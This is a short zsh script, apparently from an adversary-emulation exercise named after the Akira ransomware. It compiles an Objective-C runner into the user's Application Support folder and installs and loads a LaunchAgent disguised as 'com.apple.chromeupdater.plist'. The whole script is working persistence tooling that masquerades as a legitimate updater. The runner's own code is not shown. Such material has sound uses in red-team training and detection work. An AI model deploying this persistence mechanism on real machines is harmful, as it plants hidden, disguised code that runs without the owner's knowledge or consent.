#!/bin/zsh

# Define paths
REPO_DIR="$HOME/Documents/Akira_Exercise"
RUNNER_SRC="$REPO_DIR/working_runner.m"
RUNNER_BIN="$HOME/Library/Application Support/working_runner"
PLIST_SRC="$REPO_DIR/com.apple.chromeupdater.plist"
PLIST_DEST="$HOME/Library/LaunchAgents/com.apple.chromeupdater.plist"

# Compile the runner
echo "[*] Compiling runner..."
clang -target arm64-apple-darwin -framework Foundation -fobjc-arc -o "$RUNNER_BIN" "$RUNNER_SRC"
if [[ $? -ne 0 ]]; then
    echo "[!] Compilation failed."
    exit 1
fi

# Move the plist file
echo "[*] Moving plist to LaunchAgents..."
cp "$PLIST_SRC" "$PLIST_DEST"

# Load the LaunchAgent
echo "[*] Loading LaunchAgent..."
launchctl unload "$PLIST_DEST" 2>/dev/null
launchctl load "$PLIST_DEST"

if [[ $? -eq 0 ]]; then
    echo "[+] LaunchAgent loaded successfully."
else
    echo "[!] Failed to load LaunchAgent."
fi
